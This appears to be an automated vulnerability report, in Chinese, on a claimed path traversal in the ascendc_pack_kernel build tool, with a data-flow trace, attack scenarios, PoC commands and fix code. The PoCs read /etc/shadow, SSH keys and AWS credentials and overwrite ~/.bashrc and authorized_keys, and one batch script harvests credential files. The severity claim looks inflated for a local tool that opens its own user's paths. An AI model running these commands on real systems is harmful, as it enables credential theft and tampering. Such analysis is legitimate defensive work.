# VULN-DF-001: ascendc_pack_kernel.c 路径遍历漏洞深度分析报告

## 基本信息

| 属性 | 值 |
|------|-----|
| 漏洞ID | VULN-DF-001 |
| 漏洞类型 | 路径遍历 (Path Traversal) |
| CWE编号 | CWE-22 |
| 严重性 | High |
| 置信度 | 85 (CONFIRMED) |
| 文件位置 | tools/build/asc_pack_kernel/ascendc_pack_kernel.c:75-122 |
| 函数名 | main |
| 发现者 | dataflow-scanner |

## 漏洞概述

### 漏洞代码片段

```c
// ascendc_pack_kernel.c:65-127
#if !(defined(UT_TEST) || defined(ST_TEST))
int main(int argc, char *argv[])
#else
int AscendcPackKernelMain(int argc, char *argv[])
#endif
{
    if (argc != 0x5) {
        printf("[Error] %s <elf_in> <elf_add> <kernel_type> <elf_out>\n", argv[0]);
        return 1;
    }

    // 漏洞点: argv 参数直接用作文件路径，无任何验证
    const char* srcFile = argv[1];      // 输入 ELF 文件
    const char* kernelFile = argv[2];   // 要添加的内核段
    const char* kernelType = argv[3];   // 类型标识
    const char* dstFile = argv[4];      // 输出 ELF 文件

    size_t srcFileSize = GetFileSize(srcFile);
    size_t kernelFileSize = GetFileSize(kernelFile);
    if ((srcFileSize == 0) || kernelFileSize == 0) {
        return 1;
    }

    // ... 内存分配 ...

    // 读取文件（无路径验证）
    size_t elfAddLen = ReadFile(kernelFile, sec, kernelFileSize);
    size_t ssz = ReadFile(srcFile, src, srcFileSize);
    
    // ... 处理 ...
    
    // 写入文件（无路径验证）
    (void)WriteFile(dstFile, dst, dsz);
    
    free(src);
    free(dst);
    free(sec);
    return 0;
}
```

### 底层函数分析

```c
// GetFileSize: 使用 fopen 打开文件
size_t GetFileSize(const char* filePath)
{
    FILE *file = fopen(filePath, "rb");  // 无路径验证
    if (file == NULL) {
        printf("[Error] open file: %s failed.\n", filePath);
        return 0;
    }
    // ...
}

// ReadFile: 使用 open 系统调用
size_t ReadFile(const char *file, void *buf, size_t len)
{
    int fd = open(file, O_RDONLY);  // 无路径验证
    size_t size = (size_t)read(fd, buf, len);
    // ...
}

// WriteFile: 使用 open 创建/覆盖文件
size_t WriteFile(const char *file, void *buf, size_t len)
{
    int fd = open(file, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR | S_IWUSR);  // 无路径验证
    size_t size = (size_t)write(fd, buf, len);
    // ...
}
```

### 漏洞成因

1. **argv 参数直接使用**：`argv[1]`、`argv[2]`、`argv[4]` 直接赋值给 `srcFile`、`kernelFile`、`dstFile` 变量
2. **无路径规范化**：未使用 `realpath()` 或类似函数验证路径
3. **无目录限制**：未检查路径是否在允许的工作目录范围内
4. **无路径遍历检测**：未检查 `../` 序列或绝对路径

### 数据流追踪

```
命令行调用
  └── argv[1] = 用户输入路径
        └── main:75 srcFile = argv[1]
              └── GetFileSize(srcFile) -> fopen(srcFile, "rb") [SINK]
              └── ReadFile(srcFile, ...) -> open(srcFile, O_RDONLY) [SINK]

  └── argv[2] = 用户输入路径
        └── main:76 kernelFile = argv[2]
              └── GetFileSize(kernelFile) -> fopen(kernelFile, "rb") [SINK]
              └── ReadFile(kernelFile, ...) -> open(kernelFile, O_RDONLY) [SINK]

  └── argv[4] = 用户输入路径
        └── main:78 dstFile = argv[4]
              └── WriteFile(dstFile, ...) -> open(dstFile, O_CREAT|O_WRONLY|O_TRUNC) [SINK]
```

### 入口点分析

该工具通过以下方式调用：

1. **直接 CLI 调用**：
```bash
./ascendc_pack_kernel input.elf kernel.bin 0 output.elf
```

2. **通过构建脚本调用**（从 func.cmake 或其他脚本）

由于是编译工具，通常在构建流程中调用，路径参数可能来自：
- CMake 配置变量
- 环境变量
- 其他脚本传递

## 攻击场景分析

### 场景1: 读取任意文件

攻击者可读取系统任意位置的敏感文件：

```bash
# 读取 /etc/passwd 到输出文件
./ascendc_pack_kernel /etc/passwd /dev/null 0 /tmp/leaked_passwd

# 但需要注意 GetFileSize() 会检查文件大小
# 如果 srcFileSize == 0 或 kernelFileSize == 0 则返回
```

由于 `kernelFileSize` 也需要非零，攻击者需要提供一个有效的 kernel 文件：

```bash
# 准备任意文件作为 kernel
echo "dummy" > /tmp/dummy_kernel

# 读取 /etc/shadow
./ascendc_pack_kernel /etc/shadow /tmp/dummy_kernel 0 /tmp/leaked_shadow

# 读取 SSH 私钥
./ascendc_pack_kernel ~/.ssh/id_rsa /tmp/dummy_kernel 0 /tmp/leaked_key
```

### 场景2: 使用路径遍历绕过目录限制

如果工具预期在某个工作目录内操作：

```bash
# 假设预期输入目录为 /project/output
# 使用 ../ 遍历到上级目录
./ascendc_pack_kernel \
    /project/output/../etc/passwd \
    /project/output/../tmp/dummy_kernel \
    0 \
    /project/output/../tmp/leaked

# 等价于读取 /etc/passwd
```

### 场景3: 写入任意位置文件

输出文件路径 `dstFile` 可指向任意位置：

```bash
# 写入到系统敏感位置
./ascendc_pack_kernel normal.elf kernel.bin 0 /etc/malicious_config

# 覆盖用户配置文件
./ascendc_pack_kernel crafted.elf kernel.bin 0 ~/.bashrc

# 写入到 SSH authorized_keys
./ascendc_pack_kernel crafted.elf kernel.bin 0 ~/.ssh/authorized_keys
```

### 场景4: 文件覆盖攻击

攻击者可覆盖重要系统文件或配置：

```bash
# 覆盖 /etc/passwd（需要 root 权限）
./ascendc_pack_kernel crafted.elf kernel.bin 0 /etc/passwd

# 覆盖构建产物
./ascendc_pack_kernel malicious.elf kernel.bin 0 /project/build/critical_output.o
```

### 场景5: 符号链接攻击

结合符号链接进行攻击：

```bash
# 创建指向敏感文件的符号链接
ln -s /etc/shadow /tmp/link_shadow

# 工具会读取符号链接指向的文件
./ascendc_pack_kernel /tmp/link_shadow /tmp/dummy_kernel 0 /tmp/exfil_shadow
```

### 场景6: 空字节注入 (受限)

C 语言字符串以空字节结尾，如果路径中包含 `\x00`，后面的内容会被截断。但这不是主要攻击路径。

## PoC 概念验证

### 基础 PoC: 验证路径遍历能力

```bash
# 创建测试环境
cd /home/pwn20tty/Desktop/opencode_project/cann/5/asc-devkit/tools/build/asc_pack_kernel

# 编译工具（如果尚未编译）
gcc ascendc_pack_kernel.c -o ascendc_pack_kernel_test

# 准备测试文件
echo "test content" > /tmp/test_input.elf
echo "kernel data" > /tmp/test_kernel.bin

# 正常调用
./ascendc_pack_kernel_test /tmp/test_input.elf /tmp/test_kernel.bin 0 /tmp/test_output.elf

# 验证路径遍历 - 读取 /etc/passwd
./ascendc_pack_kernel_test /etc/passwd /tmp/test_kernel.bin 0 /tmp/VULN_DF_001_READ

# 检查读取结果
cat /tmp/VULN_DF_001_READ
# 如果包含 /etc/passwd 内容（部分，取决于 ELF 处理），确认漏洞
```

### 使用路径遍历 PoC

```bash
# 从限制目录遍历
mkdir -p /tmp/safe_workdir
cd /tmp/safe_workdir

# 使用 ../ 序列遍历
./ascendc_pack_kernel \
    ./../../../etc/passwd \
    /tmp/test_kernel.bin \
    0 \
    ./../../../tmp/traversed_output
```

### 敏感文件读取 PoC

```bash
# 读取 SSH 私钥（如果存在）
./ascendc_pack_kernel ~/.ssh/id_rsa /tmp/kernel.bin 0 /tmp/exfil_ssh_key

# 读取 AWS/云服务凭证
./ascendc_pack_kernel ~/.aws/credentials /tmp/kernel.bin 0 /tmp/exfil_aws

# 读取用户历史记录
./ascendc_pack_kernel ~/.bash_history /tmp/kernel.bin 0 /tmp/exfil_history
```

### 写入任意位置 PoC

```bash
# 在用户目录写入标记文件
./ascendc_pack_kernel /tmp/test.elf /tmp/kernel.bin 0 ~/VULN_DF_001_WRITE_MARKER

# 验证
ls -la ~/VULN_DF_001_WRITE_MARKER

# 尝试覆盖配置文件（需要观察效果）
./ascendc_pack_kernel /tmp/malicious_content /tmp/kernel.bin 0 ~/.profile
```

### 批量信息收集 PoC (脚本化)

```bash
#!/bin/bash
# path_traversal_exfil.sh - 自动化信息收集

KERNEL_FILE="/tmp/dummy_kernel.bin"
echo "dummy" > "$KERNEL_FILE"

TARGETS=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/hosts"
    "$HOME/.ssh/id_rsa"
    "$HOME/.ssh/id_ed25519"
    "$HOME/.bashrc"
    "$HOME/.aws/credentials"
    "$HOME/.gitconfig"
)

OUTPUT_DIR="/tmp/exfil_results"
mkdir -p "$OUTPUT_DIR"

for target in "${TARGETS[@]}"; do
    if [ -f "$target" ]; then
        filename=$(basename "$target")
        ./ascendc_pack_kernel "$target" "$KERNEL_FILE" 0 "$OUTPUT_DIR/$filename"
        echo "Extracted: $target"
    fi
done

echo "All extracted files saved to $OUTPUT_DIR"
```

## 影响评估

### 直接影响

| 影响类型 | 严重程度 | 说明 |
|----------|----------|------|
| 任意文件读取 | **High** | 可读取系统任何位置的文件 |
| 任意文件写入 | **High** | 可写入/覆盖系统任何位置的文件 |
| 信息泄露 | High | 可窃取密码、密钥、凭证等敏感信息 |
| 配置篡改 | Critical | 可修改系统配置、植入恶意内容 |

### 间接影响

1. **权限提升**：如果覆盖 `/etc/sudoers` 或写入 cron 任务
2. **持久化**：写入 `.bashrc` 或其他启动脚本植入后门
3. **横向移动**：窃取 SSH 密钥后访问其他系统
4. **构建污染**：覆盖编译产物，影响下游用户

### 权限限制下的影响

| 运行权限 | 可影响范围 |
|----------|-----------|
| root | 整个系统（/etc/shadow, /etc/passwd, 系统配置） |
| 普通用户 | 用户目录（~/.ssh, ~/.bashrc, 用户文件） |
| 服务账户 | 服务目录、服务配置 |

### 前置条件

| 条件 | 必要性 | 说明 |
|------|--------|------|
| 能执行工具 | **必须** | 需有执行 ascendc_pack_kernel 的权限 |
| 能控制路径参数 | **必须** | 通过 CLI 或构建系统传递 |
| 目标文件存在 | 读取必须 | 要读取的文件需存在 |
| 目标目录可写 | 写入必须 | 要写入的目录需有写权限 |

## 漏洞与 ELF 处理的交互

### ELF 处理流程分析

```c
// 核心处理逻辑
uint32_t type = (uint32_t)strtol(kernelType, NULL, 10);
if (type >= ELF_TYPE_MAX) {
    printf("[Error] sec_name type: %s is error!\n", kernelType);
    // ...
}

size_t dsz = ElfAddSection(src, ssz, dst, srcFileSize, sec, elfAddLen, type);
```

**关键观察**：

1. 工具预期输入是 ELF 文件，会进行 ELF 处理
2. 如果输入非 ELF 文件，`ElfAddSection()` 行为取决于其实现
3. 输出文件会被写入 ELF 处理后的内容

**攻击影响**：

- 即使输入非 ELF 文件，数据仍会被写入输出路径
- 输出内容可能包含原始数据的一部分（取决于 ELF 处理逻辑）
- 路径遍历漏洞不依赖于输入是否为合法 ELF

### 数据完整性考量

读取的数据经过 `ElfAddSection()` 处理后才写入。这意味着：

- 输出文件不是简单的原始文件副本
- 但文件内容的部分数据仍可泄露
- 对于信息收集攻击，部分数据可能足够有价值

## 修复建议

### 推荐: 路径验证和规范化

```c
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

// 安全的路径验证函数
static int validate_path(const char* path, const char* allowed_base) {
    char resolved_path[PATH_MAX];
    char resolved_base[PATH_MAX];
    
    // 规范化路径
    if (realpath(path, resolved_path) == NULL) {
        printf("[Error] Cannot resolve path: %s (%s)\n", path, strerror(errno));
        return -1;
    }
    
    // 如果指定了允许的基目录，检查路径是否在范围内
    if (allowed_base != NULL) {
        if (realpath(allowed_base, resolved_base) == NULL) {
            printf("[Error] Cannot resolve base path: %s\n", allowed_base);
            return -1;
        }
        
        // 检查路径是否以基目录开头
        size_t base_len = strlen(resolved_base);
        if (strncmp(resolved_path, resolved_base, base_len) != 0) {
            printf("[Error] Path %s is outside allowed directory %s\n", 
                   resolved_path, resolved_base);
            return -1;
        }
    }
    
    // 检查路径遍历序列
    if (strstr(path, "..") != NULL) {
        printf("[Error] Path traversal detected in: %s\n", path);
        return -1;
    }
    
    return 0;
}

// 安全的文件大小获取
static size_t safe_get_file_size(const char* filePath, const char* allowed_base) {
    if (validate_path(filePath, allowed_base) != 0) {
        return 0;
    }
    return GetFileSize(filePath);
}

int main(int argc, char *argv[]) {
    // ...
    
    const char* srcFile = argv[1];
    const char* kernelFile = argv[2];
    const char* kernelType = argv[3];
    const char* dstFile = argv[4];
    
    // 定义允许的工作目录（可从环境变量或配置获取）
    const char* allowed_base = getenv("ASCEND_PACK_ALLOWED_DIR");
    // 如果未设置，使用当前工作目录
    if (allowed_base == NULL) {
        allowed_base = ".";
    }
    
    // 验证所有路径
    if (validate_path(srcFile, allowed_base) != 0 ||
        validate_path(kernelFile, allowed_base) != 0 ||
        validate_path(dstFile, allowed_base) != 0) {
        return 1;
    }
    
    // 继续处理...
}
```

### 备选方案: 仅验证路径遍历

```c
static int check_path_traversal(const char* path) {
    // 检查 ../ 序列
    if (strstr(path, "..") != NULL) {
        return -1;
    }
    
    // 检查绝对路径是否在允许范围
    if (path[0] == '/') {
        const char* allowed_prefixes[] = {
            "/usr/local/ascend",
            "/opt/ascend",
            "/tmp/ascend",
            NULL
        };
        
        for (int i = 0; allowed_prefixes[i] != NULL; i++) {
            if (strncmp(path, allowed_prefixes[i], strlen(allowed_prefixes[i])) == 0) {
                return 0;
            }
        }
        return -1;  // 绝对路径不在允许范围
    }
    
    return 0;  // 相对路径无 ../ 序列，允许
}
```

### 增强型防护

```c
#include <sys/stat.h>

// 检查文件类型是否为预期的 ELF
static int check_file_type(const char* path) {
    struct stat st;
    if (stat(path, &st) != 0) {
        return -1;
    }
    
    // 检查是否为普通文件
    if (!S_ISREG(st.st_mode)) {
        printf("[Error] %s is not a regular file\n", path);
        return -1;
    }
    
    // 可选: 检查 ELF 魔数
    FILE* f = fopen(path, "rb");
    if (f == NULL) return -1;
    
    unsigned char magic[4];
    if (fread(magic, 1, 4, f) != 4) {
        fclose(f);
        return -1;
    }
    fclose(f);
    
    // ELF 魔数: 0x7f, 'E', 'L', 'F'
    if (magic[0] != 0x7f || magic[1] != 'E' || magic[2] != 'L' || magic[3] != 'F') {
        printf("[Error] %s is not a valid ELF file\n", path);
        return -1;
    }
    
    return 0;
}
```

### 完整修复示例

```c
int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("[Error] Usage: %s <elf_in> <elf_add> <kernel_type> <elf_out>\n", argv[0]);
        return 1;
    }

    const char* srcFile = argv[1];
    const char* kernelFile = argv[2];
    const char* kernelType = argv[3];
    const char* dstFile = argv[4];

    // 1. 路径验证
    if (check_path_traversal(srcFile) != 0) {
        printf("[Error] Invalid source file path: %s\n", srcFile);
        return 1;
    }
    if (check_path_traversal(kernelFile) != 0) {
        printf("[Error] Invalid kernel file path: %s\n", kernelFile);
        return 1;
    }
    if (check_path_traversal(dstFile) != 0) {
        printf("[Error] Invalid destination file path: %s\n", dstFile);
        return 1;
    }

    // 2. ELF 文件类型检查
    if (check_file_type(srcFile) != 0) {
        return 1;
    }

    // 3. 使用 realpath 规范化路径
    char resolved_src[PATH_MAX];
    char resolved_dst[PATH_MAX];
    if (realpath(srcFile, resolved_src) == NULL) {
        printf("[Error] Cannot resolve source path\n");
        return 1;
    }

    // dstFile 可能不存在，使用目录的 realpath
    char* dst_dir = strdup(dstFile);
    char* last_slash = strrchr(dst_dir, '/');
    if (last_slash != NULL) {
        *last_slash = '\0';
        char resolved_dir[PATH_MAX];
        if (realpath(dst_dir, resolved_dir) == NULL) {
            printf("[Error] Cannot resolve destination directory\n");
            free(dst_dir);
            return 1;
        }
        snprintf(resolved_dst, PATH_MAX, "%s/%s", resolved_dir, last_slash + 1);
    }
    free(dst_dir);

    // 4. 使用验证后的路径继续处理
    size_t srcFileSize = GetFileSize(resolved_src);
    // ...
}
```

## 修复优先级

| 优先级 | 说明 |
|--------|------|
| **P0 - 立即修复** | 可读取/写入任意文件，影响系统安全 |

## 与其他漏洞类型的关系

| 漏洞类型 | 本漏洞关联 |
|----------|-----------|
| CWE-22 路径遍历 | 本漏洞核心类型 |
| CWE-36 绝对路径遍历 | 可接受绝对路径作为输入 |
| CWE-41 文件路径完整性问题 | 未验证路径完整性 |
| CWE-59 不检查路径开头 | 未检查路径是否以安全前缀开头 |

## 项目其他文件的类似问题

建议检查项目中其他使用文件路径的 C/C++ 文件：

```bash
# 查找使用 fopen/open 但无路径验证的代码
grep -rn "fopen\s*\(" --include="*.c" --include="*.cpp" PROJECT_ROOT
grep -rn "open\s*\(" --include="*.c" --include="*.cpp" PROJECT_ROOT | grep -v "//\s*comment"

# 查找 argv 直接用于文件操作的代码
grep -rn "argv\[.*\]" --include="*.c" --include="*.cpp" PROJECT_ROOT | grep -E "(fopen|open|read|write)"
```

---

**报告生成时间**: 2026-04-22  
**分析者**: details-analyzer  
**状态**: CONFIRMED